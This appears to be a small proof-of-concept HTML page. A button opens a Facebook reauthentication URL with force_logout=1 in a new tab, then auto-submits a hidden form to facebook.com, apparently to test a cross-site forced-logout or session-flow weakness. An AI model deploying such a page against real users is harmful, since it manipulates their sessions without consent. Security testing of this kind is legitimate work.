<!DOCTYPE html>
<html>
<head>
  <title>Open URL and Submit Form</title>
  <script>
    function handleClick() {
      // Open the reauth/logout URL in a new tab
      window.open(
        'https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=61559852429573&force_logout=1',
        '_blank'
      );

      // Wait 2 seconds, then submit the form to Facebook
      setTimeout(function () {
        document.getElementById('fbForm').submit();
      }, 2000);
    }
  </script>
</head>
<body>
  <button onclick="handleClick()">Click to Trigger</button>

  <!-- Hidden form to be submitted to Facebook -->
  <form id="fbForm" action="https://www.facebook.com" method="GET" target="_self">
    <!-- You can add hidden inputs here if needed -->
  </form>
</body>
</html>
